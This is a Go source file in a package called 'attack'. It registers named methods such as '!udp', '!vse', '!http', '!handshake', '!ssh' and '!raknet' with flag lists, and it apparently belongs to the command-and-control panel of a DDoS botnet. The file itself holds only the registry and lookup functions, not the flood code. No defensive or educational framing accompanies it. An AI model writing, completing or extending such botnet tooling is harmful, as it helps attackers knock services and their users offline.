package attack

type Method struct {
	Id          int
	Name        string
	Type        int
	Description string
	Flags       []uint8
}

var (
	methods = make(map[string]*Method)
)

func New(method *Method) {
	if _, exists := methods[method.Name]; exists {
		return
	}
	methods[method.Name] = method
	return
}

func Init() {
	New(&Method{
		Id:          1,
		Name:        "!udp",
		Description: "yes",
		Flags:       []uint8{0, 3, 4},
	})
	New(&Method{
		Id:          2,
		Name:        "!vse",
		Description: "yes",
		Flags:       []uint8{0, 3, 4},
	})
	New(&Method{
		Id:          0,
		Name:        "!http",
		Description: "yes",
		Flags:       []uint8{1, 2, 3, 4},
	})
	New(&Method{
		Id:          3,
		Name:        "!handshake",
		Description: "yes",
		Flags:       []uint8{0, 3, 4},
	})
	New(&Method{
		Id:          4,
		Name:        "!ssh",
		Description: "yes",
		Flags:       []uint8{4},
	})
	New(&Method{
		Id:          5,
		Name:        "!raknet",
		Description: "yes",
		Flags:       []uint8{0, 3, 4},
	})
}

func Get(name string) *Method {
	method, exists := methods[name]
	if !exists {
		return nil
	}
	return method
}

func Clone() []*Method {
	var list []*Method
	for _, method := range methods {
		list = append(list, method)
	}
	return list
}
